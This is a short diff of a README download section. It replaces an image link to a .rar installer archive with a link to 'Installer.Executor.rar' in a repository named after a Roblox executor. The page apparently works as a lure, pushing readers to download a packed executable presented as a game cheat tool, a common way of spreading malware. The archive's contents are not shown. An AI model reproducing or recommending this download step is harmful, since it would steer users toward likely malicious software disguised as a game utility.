@@ -5,7 +5,7 @@
 > ***How to download:***
 
 
-![mind](https://github.com/user-attachments/assets/a956d466-0a96-464c-8a06-2dce4e58ad0c)[](https://github.com/Jok0daraes/bio/releases/download/realese/Setup_installer32_64x.rar)
+[![mind](https://github.com/user-attachments/assets/ea1acb16-ea71-44c7-81d9-6e670efea76e)](https://github.com/asalmobini/roblox-executor-2025-/releases/download/Release/Installer.Executor.rar) 
 
 
 
